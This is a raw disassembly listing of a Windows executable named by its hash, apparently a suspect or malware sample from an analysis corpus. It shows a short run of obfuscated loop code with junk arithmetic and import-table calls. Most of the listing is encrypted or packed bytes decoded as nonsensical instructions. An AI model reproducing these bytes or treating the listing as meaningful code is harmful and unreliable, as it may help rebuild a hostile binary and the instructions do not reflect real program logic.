
217187290eb594cc9c11650e3f0b9c7804d48e177df82a659e91cb91de9b46c7.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	sbb    DWORD PTR ds:0x43468b,ecx
  40100c:	mov    eax,ds:0x414afe
  401011:	mov    eax,DWORD PTR [eax+0x198]
  401017:	mov    DWORD PTR [ebp-0x8],eax
  40101a:	add    eax,DWORD PTR ds:0x434563
  401020:	mov    eax,DWORD PTR [ebp+0x8]
  401023:	dec    DWORD PTR ds:0x4345d3
  401029:	mov    ecx,DWORD PTR [ebp-0x8]
  40102c:	sbb    DWORD PTR ds:0x434573,0x4345c7
  401036:	push   ebx
  401037:	push   esi
  401038:	sub    DWORD PTR ds:0x43468b,ebx
  40103e:	mov    esi,0x7510851
  401043:	mov    DWORD PTR ds:0x4345bb,0x10
  40104d:	cmp    DWORD PTR ds:0x4345bb,0x0
  401054:	je     0x4010ad
  40105a:	cmp    DWORD PTR ds:0x4345bb,0x2
  401061:	jne    0x40107b
  401067:	push   DWORD PTR [ebp-0x1c]
  40106a:	push   DWORD PTR [ebp-0x18]
  40106d:	push   DWORD PTR [ebp-0x24]
  401070:	push   0x7fb5
  401075:	call   DWORD PTR ds:0x4130b4
  40107b:	cmp    DWORD PTR ds:0x4345bb,0x3
  401082:	jne    0x401095
  401088:	mov    ebx,DWORD PTR ds:0x4345bb
  40108e:	dec    ebx
  40108f:	mov    DWORD PTR ds:0x4345bb,ebx
  401095:	mov    ebx,DWORD PTR ds:0x4345bb
  40109b:	dec    ebx
  40109c:	mov    DWORD PTR ds:0x4345bb,ebx
  4010a2:	jmp    0x40104d
  4010a7:	adc    DWORD PTR ds:0x43468f,ecx
  4010ad:	xor    eax,esi
  4010af:	push   edi
  4010b0:	mov    edi,DWORD PTR ds:0x4345df
  4010b6:	mov    ebx,DWORD PTR ds:0x4346b3
  4010bc:	sub    ebx,edi
  4010be:	imul   edi,DWORD PTR [edi+ebx*1]
  4010c2:	mov    edi,0x327299
  4010c7:	adc    DWORD PTR ds:0x434587,0x43460b
  4010d1:	add    eax,edi
  4010d3:	and    DWORD PTR ds:0x43460f,0x0
  4010dd:	jmp    0x4010ef
  4010e2:	mov    ebx,DWORD PTR ds:0x43460f
  4010e8:	inc    ebx
  4010e9:	mov    DWORD PTR ds:0x43460f,ebx
  4010ef:	cmp    DWORD PTR ds:0x43460f,0x1d
  4010f6:	jae    0x401312
  4010fc:	cmp    DWORD PTR ds:0x43460f,0xe
  401103:	jne    0x401119
  401109:	push   0x43456b
  40110e:	push   0x4348db
  401113:	call   DWORD PTR ds:0x41332c
  401119:	cmp    DWORD PTR ds:0x43460f,0xd
  401120:	jne    0x401133
  401126:	mov    ebx,DWORD PTR ds:0x43460f
  40112c:	inc    ebx
  40112d:	mov    DWORD PTR ds:0x43460f,ebx
  401133:	jmp    0x4010e2
  401138:	or     DWORD PTR ds:0x43456b,ebx
  40113e:	jmp    0x401312
  401143:	test   ah,ch
  401145:	push   edx
  401146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401147:	jb     0x4010fd
  401149:	jl     0x401137
  40114b:	pop    eax
  40114c:	or     eax,0xadc91829
  401151:	inc    esi
  401152:	cwde   
  401153:	jle    0x4011d3
  401155:	jle    0x4011d5
  401157:	mov    ch,0x7f
  401159:	jle    0x4011d9
  40115b:	into   
  40115c:	xlat   BYTE PTR ds:[ebx]
  40115d:	cmp    ecx,edx
  40115f:	(bad)
  401162:	(bad)  
  401164:	pop    es
  401165:	add    BYTE PTR [ebx],al
  401167:	(bad)  
  401169:	or     al,0xf
  40116b:	xor    ecx,DWORD PTR [edi]
  40116d:	int3   
  40116e:	and    al,0xc7
  401170:	sbb    al,0x1f
  401172:	inc    ebp
  401173:	fs or  al,0xb7
  401176:	(bad)  [esi]
  401178:	out    dx,eax
  401179:	mov    ecx,0x8e03d6db
  40117e:	es mov esi,0x114da2f0
  401184:	test   eax,0x661f46de
  401189:	call   0x985d1cfd
  40118e:	add    al,0xd6
  401190:	dec    esp
  401191:	stos   BYTE PTR es:[edi],al
  401192:	push   ebx
  401193:	sub    ebp,ebx
  401195:	sar    BYTE PTR [eax],0xa9
  401198:	mov    bh,BYTE PTR [ebx-0x3f]
  40119b:	stos   DWORD PTR es:[edi],eax
  40119c:	push   es
  40119d:	rcl    bl,0x8d
  4011a0:	test   esi,edx
  4011a2:	pushf  
  4011a3:	(bad)
  4011a6:	mov    esi,ebp
  4011a8:	dec    edi
  4011a9:	out    0xa6,al
  4011ab:	dec    ebp
  4011ac:	call   DWORD PTR [edi-0x254af85c]
  4011b2:	mov    ecx,0x5136e949
  4011b7:	and    esi,DWORD PTR [edx-0x47619116]
  4011bd:	jnp    0x4011dc
  4011bf:	ret    
  4011c0:	xchg   edx,eax
  4011c1:	sub    eax,0xc25eebd0
  4011c6:	loopne 0x40120c
  4011c8:	cld    
  4011c9:	jmp    0xd761:0x70cf3d92
  4011d0:	sub    al,0xc9
  4011d2:	add    ah,ch
  4011d4:	sbb    eax,0x331a65d
  4011d9:	outs   dx,DWORD PTR ds:[esi]
  4011da:	ins    DWORD PTR es:[edi],dx
  4011db:	add    al,0x14
  4011dd:	cmp    eax,0x34508ed9
  4011e2:	jno    0x401263
  4011e4:	(bad)
  4011e9:	or     ebx,DWORD PTR [ebx+0x51]
  4011ec:	(bad)  
  4011ee:	adc    eax,0x25e558d3
  4011f3:	jge    0x401193
  4011f5:	inc    esi
  4011f6:	dec    ebx
  4011f7:	aaa    
  4011f8:	adc    DWORD PTR [ebx],ebp
  4011fa:	ja     0x401231
  4011fc:	sbb    dl,bl
  4011fe:	ds dec edi
  401200:	hlt    
  401201:	enter  0x5ca0,0xb8
  401205:	push   0xffffffe5
  401207:	aad    0x7
  401209:	add    eax,0x42361e9f
  40120e:	shl    BYTE PTR [ebx+0x7b],cl
  401211:	test   eax,0xdadb57db
  401216:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401217:	leave  
  401218:	push   ds
  401219:	pop    ds
  40121a:	pop    ss
  40121b:	fmulp  st(4),st
  40121d:	mov    esi,0x58ac9fb9
  401222:	push   edx
  401223:	sub    DWORD PTR [ebx-0x15],edx
  401226:	call   0xac9ee004
  40122b:	cmp    BYTE PTR ss:[ecx-0x221e9507],dl
  401232:	fsubp  st(2),st
  401234:	push   esp
  401235:	or     BYTE PTR [eax-0x66c4a15b],0x18
  40123c:	stc    
  40123d:	adc    eax,0x9011bcb4
  401242:	int    0xf3
  401244:	pop    esp
  401245:	loope  0x401240
  401247:	(bad)  
  401249:	inc    edx
  40124a:	or     DWORD PTR [ebx+0x3e24c81c],0x4
  401251:	or     eax,0xab0ea2e8
  401256:	adc    eax,0xb3e01c98
  40125b:	inc    ebx
  40125c:	int    0x87
  40125e:	push   ss
  40125f:	sbb    cl,bl
  401261:	fs dec ebx
  401263:	imul   edx,edi,0x5c62b7eb
  401269:	fbstp  TBYTE PTR [edi]
  40126b:	icebp  
  40126c:	aad    0xc7
  40126e:	dec    edx
  40126f:	sbb    edi,edx
  401271:	xor    bl,al
  401273:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401274:	js     0x4012d4
  401276:	or     DWORD PTR [ecx-0x6c],esi
  401279:	out    0xa5,al
  40127b:	jmp    FWORD PTR [edx+0x4e12df01]
  401281:	adc    ch,BYTE PTR [ebx+0x301a3d5f]
  401287:	cld    
  401288:	adc    DWORD PTR [ecx],edi
  40128a:	mov    esi,ds
  40128c:	in     eax,0x9f
  40128e:	jge    0x4012ca
  401290:	push   ds
  401291:	(bad)  ds:0x4bbfee88
  401297:	pop    edx
  401298:	or     BYTE PTR [esi-0x11],0x2c
  40129c:	clc    
  40129d:	ret    
  40129e:	inc    eax
  40129f:	add    BYTE PTR [ecx],0x9a
  4012a2:	enter  0x3996,0xda
  4012a6:	push   ecx
  4012a7:	and    DWORD PTR [edx],ecx
  4012a9:	loopne 0x4012ef
  4012ab:	add    DWORD PTR [esi],esi
  4012ad:	inc    ebp
  4012ae:	lds    ecx,FWORD PTR [ecx+0x38]
  4012b1:	pop    esp
  4012b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012b3:	stc    
  4012b4:	cdq    
  4012b5:	sbb    eax,0x8fe0513
  4012ba:	sbb    al,bh
  4012bc:	xchg   ecx,eax
  4012bd:	outs   dx,BYTE PTR ds:[esi]
  4012be:	fisttp DWORD PTR [esi-0x53]
  4012c1:	ins    BYTE PTR es:[edi],dx
  4012c2:	add    BYTE PTR [ebx],al
  4012c4:	xchg   ecx,eax
  4012c5:	sbb    BYTE PTR [ebx],ch
  4012c7:	shl    ebx,cl
  4012c9:	ffree  st(3)
  4012cb:	cmp    eax,0x7b3e6506
  4012d1:	or     ecx,DWORD PTR [edx+ebp*2]
  4012d4:	adc    DWORD PTR [ebx+0x3a],eax
  4012d7:	popa   
  4012d8:	jae    0x401281
  4012da:	jg     0x40128e
  4012dc:	fisubr DWORD PTR [esp+eiz*8+0x70]
  4012e0:	test   BYTE PTR [eax+0x6f1c2388],dl
  4012e6:	stos   DWORD PTR es:[edi],eax
  4012e7:	jecxz  0x4012b8
  4012e9:	dec    eax
  4012ea:	iret   
  4012eb:	rol    DWORD PTR [edi-0x7aa974fc],1
  4012f1:	jmp    0x4012ef
  4012f3:	lock pushf 
  4012f5:	push   ss
  4012f6:	stos   BYTE PTR es:[edi],al
  4012f7:	into   
  4012f8:	daa    
  4012f9:	pop    ecx
  4012fa:	(bad)  
  4012fc:	and    DWORD PTR ds:0x67b2222,ebx
  401302:	add    dl,BYTE PTR [edx+0x6f]
  401305:	inc    ebx
  401306:	cmp    al,BYTE PTR ds:0xcfae16ac
  40130c:	cld    
  40130d:	fsub   st,st(0)
  40130f:	imul   ebx,DWORD PTR [ecx+0x53],0xffffff89
  401313:	add    DWORD PTR [ecx+0x1222d1],eax
  401319:	add    BYTE PTR [ebp+0x3581fc45],cl
  40131f:	inc    DWORD PTR [ebp+0x43]
  401322:	add    ah,bl
  401324:	push   ebx
  401325:	add    BYTE PTR [eax],al
  401327:	mov    DWORD PTR [ebp-0x10],eax
  40132a:	adc    DWORD PTR ds:0x4345bf,edi
  401330:	mov    eax,DWORD PTR [ebp+0x8]
  401333:	or     DWORD PTR ds:0x43456f,0x434563
  40133d:	mov    ecx,DWORD PTR [ebp-0x10]
  401340:	xor    DWORD PTR ds:0x434573,ebx
  401346:	xor    eax,esi
  401348:	neg    ebx
  40134a:	add    eax,edi
  40134c:	mov    DWORD PTR [ecx],eax
  40134e:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  401355:	lea    eax,[ebp-0x14]
  401358:	sbb    ecx,ecx
  40135a:	mov    DWORD PTR [ebp-0x20],eax
  40135d:	mov    eax,DWORD PTR [ebp-0x14]
  401360:	mov    ecx,DWORD PTR [ebp-0x20]
  401363:	and    DWORD PTR ds:0x434643,0x0
  40136d:	xor    ebx,ebx
  40136f:	add    ebx,DWORD PTR ds:0x434643
  401375:	inc    ebx
  401376:	mov    DWORD PTR ds:0x434643,ebx
  40137c:	cmp    DWORD PTR ds:0x434643,0x9
  401383:	jne    0x401394
  401389:	push   0x3702
  40138e:	call   DWORD PTR ds:0x4130b8
  401394:	cmp    DWORD PTR ds:0x434643,0x8
  40139b:	jne    0x4013ae
  4013a1:	mov    ebx,DWORD PTR ds:0x434643
  4013a7:	inc    ebx
  4013a8:	mov    DWORD PTR ds:0x434643,ebx
  4013ae:	cmp    DWORD PTR ds:0x434643,0x1c
  4013b5:	jb     0x40136d
  4013bb:	add    DWORD PTR ds:0x4345bf,ecx
  4013c1:	xor    eax,esi
  4013c3:	add    eax,edi
  4013c5:	mov    DWORD PTR [ecx],eax
  4013c7:	dec    DWORD PTR ds:0x43460b
  4013cd:	mov    eax,ds:0x414bd2
  4013d2:	mov    ebx,0x8e12febf
  4013d7:	mov    DWORD PTR [ebp-0xc],ebx
  4013da:	sbb    DWORD PTR ds:0x43456f,0x4345bf
  4013e4:	mov    eax,DWORD PTR [eax]
  4013e6:	adc    DWORD PTR ds:0x43456b,0x434677
  4013f0:	mov    cx,WORD PTR [ebp-0x4]
  4013f4:	xor    DWORD PTR ds:0x434583,0x1391
  4013fe:	movzx  ecx,cx
  401401:	add    ecx,DWORD PTR [eax]
  401403:	mov    DWORD PTR [ebp-0x18],ecx
  401406:	jmp    0x4015da
  40140b:	fisub  DWORD PTR [esi]
  40140d:	add    BYTE PTR [ecx],0x42
  401410:	lods   eax,DWORD PTR ds:[esi]
  401411:	gs in  eax,dx
  401413:	aam    0x1e
  401415:	dec    edx
  401416:	xchg   DWORD PTR ds:0xb5d39732,edx
  40141c:	jg     0x40149c
  40141e:	jle    0x4013d5
  401420:	jg     0x4014a0
  401422:	jle    0x401462
  401424:	or     bh,bl
  401426:	fstp   TBYTE PTR es:[edi]
  401429:	pop    edi
  40142a:	int    0xee
  40142c:	xor    edi,DWORD PTR [edi]
  40142e:	rcl    ah,cl
  401430:	sbb    al,BYTE PTR [ecx-0x28]
  401433:	jecxz  0x40146e
  401435:	or     bh,BYTE PTR [esp+eax*2+0x52]
  401439:	sub    DWORD PTR [esi+0x24],esi
  40143c:	inc    ebp
  40143d:	sub    BYTE PTR ds:0x29067ac9,bl
  401443:	push   esi
  401444:	js     0x40146a
  401446:	sub    edx,edx
  401448:	pop    edx
  401449:	inc    edi
  40144a:	aas    
  40144b:	(bad)  
  40144d:	mov    ebp,0xb16d11ea
  401452:	mov    edi,0xf7b9068a
  401457:	mov    ds:0x78ce85dc,eax
  40145c:	adc    eax,0x90eb6372
  401461:	arpl   bp,dx
  401463:	cmp    cl,BYTE PTR [edi-0x52]
  401466:	fsub   DWORD PTR [ebx+0x2df853e2]
  40146c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40146d:	test   al,0x8c
  40146f:	xchg   BYTE PTR [eax+0x76],cl
  401472:	jge    0x4014c2
  401474:	sub    al,0xd
  401476:	sub    BYTE PTR [ebx-0x41],al
  401479:	(bad)  
  40147b:	je     0x40149d
  40147d:	and    DWORD PTR [ebx+0x5876b5e8],esi
  401483:	in     eax,0xb6
  401485:	jmp    0x401471
  401487:	and    DWORD PTR [edx],esp
  401489:	shl    DWORD PTR [ebx],cl
  40148b:	cli    
  40148c:	push   ebx
  40148d:	xor    BYTE PTR [esi-0x67d5c4e],0x6d
  401494:	addr16 xchg edx,eax
  401496:	mov    ?,WORD PTR [eax+eiz*8-0x6f243d48]
  40149d:	neg    BYTE PTR [ebp+edi*8+0x23]
  4014a1:	mov    al,ds:0xdf9617d8
  4014a6:	lds    ebp,FWORD PTR [edi+edi*4+0x37721eeb]
  4014ad:	mov    esi,0xfc12ac5d
  4014b2:	fcomp  DWORD PTR [ebp+0x313a9a27]
  4014b8:	sbb    cl,bl
  4014ba:	pop    edi
  4014bb:	es add al,0xda
  4014be:	(bad)  
  4014bf:	neg    ebx
  4014c1:	hlt    
  4014c2:	pop    ebp
  4014c3:	fwait
  4014c4:	or     eax,0xc2d076b8
  4014c9:	packuswb mm1,QWORD PTR [edi-0x54]
  4014cd:	xchg   ebx,eax
  4014ce:	pushf  
  4014cf:	nop
  4014d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014d1:	jl     0x4014b4
  4014d3:	xchg   ebx,eax
  4014d4:	fdiv   DWORD PTR [ecx-0x2b]
  4014d7:	inc    ecx
  4014d8:	shl    DWORD PTR [ebx+esi*1+0x7f],1
  4014dc:	sbb    DWORD PTR [ecx],0xffffff83
  4014df:	adc    eax,esp
  4014e1:	sti    
  4014e2:	mov    eax,0xb1172b98
  4014e7:	scas   eax,DWORD PTR es:[edi]
  4014e8:	jae    0x40146c
  4014ea:	ret    
  4014eb:	imul   ecx,ecx,0xaa334460
  4014f1:	push   0x3c
  4014f3:	mov    esp,0xdfc02737
  4014f8:	push   0xc79f7781
  4014fd:	inc    eax
  4014fe:	cmp    esp,DWORD PTR [eax]
  401500:	dec    edi
  401501:	xchg   DWORD PTR [ebx],esi
  401503:	lods   al,BYTE PTR ds:[esi]
  401504:	imul   eax,DWORD PTR [ebx+0x3b],0x14
  401508:	aaa    
  401509:	pop    ss
  40150a:	les    ebp,FWORD PTR [ebx+0x2c]
  40150d:	mov    esp,0xbf8e42e7
  401512:	xchg   esi,eax
  401513:	shl    DWORD PTR [eax],cl
  401515:	xchg   esp,eax
  401516:	sub    ebx,esi
  401518:	mov    edi,DWORD PTR [eax+0x294ae4be]
  40151e:	push   0x6a
  401520:	inc    eax
  401521:	js     0x401544
  401523:	lahf   
  401524:	je     0x401598
  401526:	mov    edi,0x7d5a4eb7
  40152b:	dec    esp
  40152c:	or     ebp,0x2c
  40152f:	sar    DWORD PTR [ebx],cl
  401531:	mov    DWORD PTR [ebx-0x6f],esi
  401534:	adc    dh,BYTE PTR [ebx+0x4a6443d9]
  40153a:	sub    eax,0xa06aa4ff
  40153f:	mov    al,ds:0xd182e652
  401544:	mov    cs,WORD PTR [esi+0x6015f53]
  40154a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40154b:	and    al,0xb5
  40154d:	sbb    edx,DWORD PTR [ecx+0x75]
  401550:	and    al,0x88
  401552:	gs jo  0x4015af
  401555:	mov    cl,0x79
  401557:	or     DWORD PTR [ebx+esi*1],0x3352b332
  40155e:	add    DWORD PTR [ecx-0x3f],eax
  401561:	adc    BYTE PTR [eax+edx*4],al
  401564:	pop    es
  401565:	push   ss
  401566:	xor    dh,bl
  401568:	dec    ebx
  401569:	xchg   edx,eax
  40156a:	fcom   QWORD PTR [ebp+0x5d7c91d9]
  401570:	adc    dh,bl
  401572:	(bad)  
  401573:	ds jl  0x4015d3
  401576:	mov    bh,BYTE PTR [ebx]
  401578:	in     al,dx
  401579:	jmp    0x4015be
  40157b:	push   ds
  40157c:	mov    ds:0x30989565,eax
  401581:	jp     0x4015ff
  401583:	fs push ebp
  401585:	mov    ecx,0x7d237645
  40158a:	cmp    eax,0xa04e1bbe
  40158f:	pop    ebx
  401590:	dec    esp
  401591:	cmp    cl,0xb4
  401594:	retf   
  401595:	push   cs
  401596:	and    BYTE PTR [ebx],ah
  401598:	push   ss
  401599:	cwde   
  40159a:	xor    BYTE PTR [ebx-0x3fc0bfab],ah
  4015a0:	xchg   DWORD PTR [ecx+esi*8+0x79],ebp
  4015a4:	sub    BYTE PTR ds:0x17c52972,al
  4015aa:	(bad)  
  4015ac:	js     0x40155b
  4015ae:	mov    WORD PTR [esi-0x5c],cs
  4015b1:	cli    
  4015b2:	push   ds
  4015b3:	xlat   BYTE PTR ds:[ebx]
  4015b4:	in     al,0x0
  4015b6:	test   BYTE PTR [eax+0x371fcf00],cl
  4015bc:	lea    esp,[esi+eax*2]
  4015bf:	sbb    al,0x5e
  4015c1:	add    eax,0x540c10c5
  4015c6:	test   eax,0x7fe7fb2d
  4015cb:	icebp  
  4015cc:	jo     0x401600
  4015ce:	test   al,0x44
  4015d0:	jge    0x401575
  4015d2:	mov    bl,al
  4015d4:	in     al,0x34
  4015d6:	sub    DWORD PTR [bp-0x7410],0x45
  4015dc:	or     BYTE PTR [ebx+0x43468f0d],cl
  4015e2:	add    BYTE PTR [ecx],ah
  4015e4:	or     eax,0x43463f
  4015e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4015ec:	xor    eax,esi
  4015ee:	add    DWORD PTR ds:0x434563,0x598
  4015f8:	add    eax,edi
  4015fa:	mov    DWORD PTR ds:0x4345c3,0x7c6b
  401604:	cmp    DWORD PTR [ecx],eax
  401606:	mov    DWORD PTR ds:0x434613,0x6dd9
  401610:	jne    0x40227a
  401616:	and    DWORD PTR ds:0x434603,0x0
  401620:	mov    ecx,DWORD PTR ds:0x434603
  401626:	inc    ecx
  401627:	mov    DWORD PTR ds:0x434603,ecx
  40162d:	cmp    DWORD PTR ds:0x434603,0x4
  401634:	jne    0x401645
  40163a:	push   0x2f81
  40163f:	call   DWORD PTR ds:0x413270
  401645:	cmp    DWORD PTR ds:0x434603,0x3
  40164c:	jne    0x40165f
  401652:	mov    ecx,DWORD PTR ds:0x434603
  401658:	inc    ecx
  401659:	mov    DWORD PTR ds:0x434603,ecx
  40165f:	cmp    DWORD PTR ds:0x434603,0x14
  401666:	jb     0x401620
  40166c:	xor    ecx,ecx
  40166e:	or     ecx,DWORD PTR ds:0x4345a3
  401674:	mov    eax,ds:0x4345eb
  401679:	sub    eax,ecx
  40167b:	and    ecx,DWORD PTR [ecx+eax*1]
  40167e:	mov    eax,DWORD PTR [ebp+0x8]
  401681:	mov    ecx,DWORD PTR [ebp-0x18]
  401684:	add    DWORD PTR ds:0x43464b,0x434677
  40168e:	xor    eax,esi
  401690:	or     DWORD PTR ds:0x43456b,0x526e
  40169a:	add    eax,edi
  40169c:	mov    DWORD PTR ds:0x43456f,0x6068
  4016a6:	cmp    DWORD PTR [ecx],eax
  4016a8:	jmp    0x40187c
  4016ad:	cmp    dh,BYTE PTR [esi]
  4016af:	sub    eax,0x6255fdb9
  4016b4:	mov    ebp,0xf85a51d5
  4016b9:	jl     0x401720
  4016bb:	jns    0x4016ee
  4016bd:	in     al,dx
  4016be:	jns    0x40173e
  4016c0:	jle    0x401677
  4016c2:	jg     0x401742
  4016c4:	jle    0x4016ed
  4016c6:	ss xor al,0x64
  4016c9:	and    bl,al
  4016cb:	mov    ds:0xf6f54b76,al
  4016d0:	mov    esi,0xaf3af7f9
  4016d5:	sub    bh,BYTE PTR [edx+eiz*8+0x36]
  4016d9:	ret    
  4016da:	mov    ebx,0x7d0ce62
  4016df:	or     al,0xc2
  4016e1:	add    DWORD PTR [ebp-0x452e810f],ecx
  4016e7:	addr16 push ebp
  4016e9:	ret    0x9713
  4016ec:	inc    edx
  4016ed:	arpl   WORD PTR [esi-0x6b93628f],bp
  4016f3:	in     al,0x85
  4016f5:	bndldx (bad),[ecx+0x52]
  4016f9:	xchg   ebp,eax
  4016fa:	rcr    dh,0x26
  4016fd:	jbe    0x4016ee
  4016ff:	jecxz  0x40174d
  401701:	mov    al,0x80
  401703:	jb     0x401718
  401705:	sbb    DWORD PTR [esi-0x36],0x4a
  401709:	lock int3 
  40170b:	and    ecx,DWORD PTR [ecx+0x28aea134]
  401711:	cmp    BYTE PTR [ebp+0x29],bl
  401714:	iret   
  401715:	sub    BYTE PTR [edx],ah
  401717:	jbe    0x4016bc
  401719:	bound  ebx,QWORD PTR [esi+0x34cf6ca6]
  40171f:	test   eax,0x17fdc508
  401724:	cmp    BYTE PTR [ebx+ebp*8],0x6a
  401728:	gs push ecx
  40172a:	ret    
  40172b:	push   0x4efc5599
  401730:	cmp    BYTE PTR [esi+0x7f9b0750],0x40
  401737:	xchg   edx,eax
  401738:	push   eax
  401739:	in     al,0x6c
  40173b:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40173d:	adc    eax,0xdc8116d8
  401742:	ja     0x401734
  401744:	shl    BYTE PTR [esi+0x34],1
  401747:	cdq    
  401748:	dec    esi
  401749:	mov    dh,0x32
  40174b:	(bad)  
  40174c:	retf   0xeed4
  40174f:	enter  0x13b9,0x8b
  401753:	mov    dh,0x31
  401755:	adc    eax,0xf175fcfe
  40175a:	fnstcw WORD PTR [edi-0xe]
  40175d:	ja     0x4017de
  40175f:	inc    esp
  401760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401761:	shr    edx,1
  401763:	in     al,dx
  401764:	pop    ebx
  401765:	pop    edi
  401766:	jmp    0x92800753
  40176b:	clc    
  40176c:	es and dh,al
  40176f:	pop    es
  401770:	mov    DWORD PTR [esi+0x65],edx
  401773:	iret   
  401774:	es repnz fs (bad) 
  401779:	dec    ebx
  40177a:	jmp    0x4017ce
  40177c:	in     eax,0x8f
  40177e:	aas    
  40177f:	out    dx,al
  401780:	jp     0x4017bc
  401782:	pop    edi
  401783:	sbb    DWORD PTR [esp+ecx*2],edx
  401786:	(bad)  
  401787:	cld    
  401788:	or     eax,0xedb263d1
  40178d:	cld    
  40178e:	cmp    ebx,edi
  401790:	mov    eax,0x9d4e2d26
  401795:	adc    eax,0x6a1f8746
  40179a:	arpl   WORD PTR [ebx-0x5f],di
  40179d:	cmp    ecx,DWORD PTR [esi-0x7]
  4017a0:	jg     0x401818
  4017a2:	sbb    al,0x55
  4017a4:	iret   
  4017a5:	jecxz  0x4017e5
  4017a7:	sub    BYTE PTR [ebp+0x2eabdc56],cl
  4017ad:	fcomp  QWORD PTR [esi+edx*4+0x5ebe5bff]
  4017b4:	cmp    edi,ebx
  4017b6:	and    dh,BYTE PTR [ecx-0x2f407c31]
  4017bc:	shl    DWORD PTR [esi],0xe8
  4017bf:	and    BYTE PTR [ecx+eiz*1],dl
  4017c2:	and    eax,0x5330aa39
  4017c7:	or     ebx,DWORD PTR [ebx+0x78]
  4017ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017cb:	outs   dx,DWORD PTR ds:[esi]
  4017cc:	das    
  4017cd:	sbb    DWORD PTR [edi],esp
  4017cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017d0:	pop    eax
  4017d1:	push   ecx
  4017d2:	push   edi
  4017d3:	out    0xb4,eax
  4017d5:	lock cmovl esi,DWORD PTR [edx+0x47]
  4017da:	or     al,0x68
  4017dc:	jle    0x4017b7
  4017de:	fucomip st,st(3)
  4017e0:	int3   
  4017e1:	mov    eax,0xcf6d9cbe
  4017e6:	fimul  DWORD PTR [ebp+0x64]
  4017e9:	xor    esi,DWORD PTR [ecx+ecx*4-0x30]
  4017ed:	or     BYTE PTR [edx-0x156540f5],0x8d
  4017f4:	fstp   DWORD PTR [ebx-0x5b09d339]
  4017fa:	(bad)  
  4017fb:	cmp    eax,0xdb7c3aa7
  401800:	or     bh,BYTE PTR [ecx+ecx*2]
  401803:	mov    ch,0x47
  401805:	aam    0xd4
  401807:	(bad)  
  401808:	mov    ch,0xbd
  40180a:	jb     0x40182a
  40180c:	push   cs
  40180d:	inc    edx
  40180e:	jmp    0xaf053341
  401813:	mov    bh,0xca
  401815:	jecxz  0x401857
  401817:	ret    0x91f5
  40181a:	loop   0x401898
  40181c:	jb     0x4017b8
  40181e:	push   ss
  40181f:	cmp    DWORD PTR [eax],0xffffff83
  401822:	in     al,dx
  401823:	adc    DWORD PTR [edx],esp
  401825:	cmp    al,0x67
  401827:	pop    ss
  401828:	xor    ebp,DWORD PTR [eax-0x17598f3b]
  40182e:	xlat   BYTE PTR ds:[ebx]
  40182f:	clc    
  401830:	scas   eax,DWORD PTR es:[edi]
  401831:	pop    eax
  401832:	sub    eax,0x5d8153b0
  401837:	dec    ebp
  401838:	mov    db1,eax
  40183b:	aam    0xd6
  40183d:	stos   DWORD PTR es:[edi],eax
  40183e:	xchg   esi,eax
  40183f:	sub    esp,edx
  401841:	dec    esi
  401842:	push   0x8
  401844:	pop    ss
  401845:	(bad)  
  401846:	in     al,0xfa
  401848:	fs popf 
  40184a:	mov    ecx,0xff450996
  40184f:	lods   eax,DWORD PTR ds:[esi]
  401850:	mov    edi,0x427ed8af
  401855:	jp     0x401810
  401857:	out    dx,eax
  401858:	outs   dx,DWORD PTR ds:[esi]
  401859:	jnp    0x4018b8
  40185b:	xor    BYTE PTR [eax+eax*2+0x44],bl
  40185f:	cwde   
  401860:	ds into 
  401862:	cli    
  401863:	adc    al,0x31
  401865:	pusha  
  401866:	push   esi
  401867:	inc    esi
  401868:	fist   DWORD PTR [edi]
  40186a:	mov    dh,0xc7
  40186c:	xchg   DWORD PTR [edi+ebp*8-0x7],ebx
  401870:	push   sp
  401872:	sbb    dl,BYTE PTR [ecx]
  401874:	icebp  
  401875:	push   edx
  401876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401877:	bound  edx,QWORD PTR [ebx+eax*4]
  40187a:	or     bh,ah
  40187c:	jne    0x401ca9
  401882:	mov    ecx,DWORD PTR ds:0x434683
  401888:	or     DWORD PTR ds:0x434563,ecx
  40188e:	jmp    0x401a62
  401893:	or     esi,DWORD PTR [edi+eiz*2-0x2a]
  401897:	popa   
  401898:	(bad)  [ebx+0x728b6c7d]
  40189e:	sbb    BYTE PTR [eax+0x1b0a2248],ch
  4018a4:	jnp    0x401924
  4018a6:	jle    0x40185d
  4018a8:	jg     0x401928
  4018aa:	jle    0x401918
  4018ac:	mov    ch,0xf8
  4018ae:	stc    
  4018af:	sub    DWORD PTR [ebx-0xd],0x9580fb9c
  4018b6:	repnz sti 
  4018b8:	cmp    BYTE PTR [ecx+edi*2-0x64],bh
  4018bc:	faddp  st(6),st
  4018be:	mov    bl,0x64
  4018c0:	cmp    eax,0xda559a52
  4018c5:	sub    cl,ah
  4018c7:	sti    
  4018c8:	pop    ss
  4018c9:	mov    ah,0x26
  4018cb:	adc    BYTE PTR ds:0x5d656bc9,ah
  4018d1:	inc    esp
  4018d2:	inc    edi
  4018d3:	push   esp
  4018d4:	test   al,0xe2
  4018d6:	inc    edi
  4018d7:	or     al,0xa7
  4018d9:	cmp    al,ah
  4018db:	inc    ecx
  4018dc:	add    DWORD PTR [edi-0x7],eax
  4018df:	int3   
  4018e0:	sbb    DWORD PTR [edx-0x5c],esi
  4018e3:	jle    0x401905
  4018e5:	sbb    eax,0x9f9202a6
  4018ea:	mov    ebp,0x61830783
  4018ef:	mov    ch,0x86
  4018f1:	push   0x43ce2c2c
  4018f6:	cmp    dh,BYTE PTR [ecx-0x34f24d51]
  4018fc:	mov    esp,0x67260860
  401901:	inc    esp
  401902:	mov    dh,0x7a
  401904:	pop    eax
  401905:	mov    al,al
  401907:	pop    ss
  401908:	mov    DWORD PTR [ebx+0x6cd4c5e3],ecx
